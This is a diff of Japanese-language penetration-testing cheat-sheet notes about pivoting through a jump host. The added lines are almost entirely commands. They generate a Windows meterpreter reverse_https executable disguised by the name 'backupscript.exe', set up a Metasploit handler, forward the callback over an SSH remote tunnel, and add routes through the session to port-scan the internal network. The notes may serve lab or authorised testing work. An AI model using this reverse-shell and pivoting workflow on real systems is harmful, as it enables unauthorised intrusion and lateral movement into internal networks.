@@ -13,12 +13,16 @@ proxychains <command> #ダイナミックポートフォワードしたあとに
 
 
 //meterpreter
+<踏み台を経由したmeterpreterセッションの確立の流れ>
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=<踏み台IP> lport=<踏み台port> -f exe -o backupscript.exe　#ピボット先のホストで動かすexe
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_https　#msfvenomに合わせたpayload
 set lhost 0.0.0.0 #proxychain経由でピボットするときは0.0.0.0を指定
 set lport 8000　#攻撃ホストでリッスンするポート
+ssh -R <踏み台IP>:<踏み台IP>:0.0.0.0:8000 <踏み台ユーザ>@<target IP>
+ピボット先ホストでexeを実行
 
+<踏み台サーバとのmeterpreterセッションを利用してルーティング>
 １台目のマシンとmeterpreterでセッションを確立したあとにbackgroundにして
 route add <ピボット先のNWアドレス> <session ID>
 use auxiliary/scanner/portscan/tcp #セッションを通じてスキャン
